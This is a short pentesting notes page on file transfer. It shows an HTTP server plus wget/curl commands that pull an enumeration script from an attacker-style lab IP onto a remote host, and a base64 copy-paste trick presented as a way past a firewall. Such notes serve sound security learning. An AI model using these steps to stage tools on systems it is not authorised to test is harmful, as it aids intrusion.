# File transfer

Sometimes we want to transfer files to another machine without having to use a middle man. Or when doing external pentesting we'd lke to transfer some enumeration scripts or smth.

There are many ways to transfer files

## Using wget

One method is to start a HTTP server on our machine and using wget or cURL to download the file on the remote host.

Servers:
[NodeJS](https://expressjs.com/en/starter/hello-world.html)
[Python](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Tools_and_setup/set_up_a_local_testing_server)
```bash
python3 -m http.server 8000
```

On remote server to download file from a server
```bash
wget http://10.10.14.1:8000/linenum.sh
```
or cURL
```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```
`-o` flag specifies output file, cuz otherwise the downloaded file is just outputted into the console

## Using SCP

This method utilizes SSH to transfer file, but you need to have valid credentials to do that

[Check](./Linux/TransferringWithSSH)

## Using Base64

There are cases when we cannot download files on remote host, because of firewall preventing us to do so. 

There's a trick. We can encode file contents into [base64](https://linux.die.net/man/1/base64).

So if we wanted to transfer file we could
```bash
base64 file.txt -w 0
```
Now we copy this string and decode it at remote with this command:
```bash
echo base64string | base64 -d > filename
``` 

## Validate file transfer

CLI `file` can let us know the type of a file.
`file shell`

To check if file contents are exactly the same we can use md5sum. The md5sum have to match for files to be the same.

```bash
md5sum file.txt
```


